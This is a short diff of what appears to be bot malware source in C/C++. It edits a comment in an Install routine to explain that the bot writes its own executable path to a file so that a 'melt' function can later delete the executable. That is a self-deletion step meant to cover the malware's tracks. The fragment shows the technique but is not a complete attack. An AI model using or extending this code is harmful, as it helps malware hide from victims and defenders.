@@ -24,7 +24,7 @@ static void Install(char *path)
       NULL
    );
    DWORD written;
-   // write there the path to current bots PE file (this file is not used later. may be useless part of code)
+   // write there the path to current bots PE file (this file is used by melt function in Bot.cpp to delete this PE file)
    Funcs::pWriteFile(hFile, path, Funcs::pLstrlenA(path), &written, NULL);
    Funcs::pCloseHandle(hFile);
    //end melt
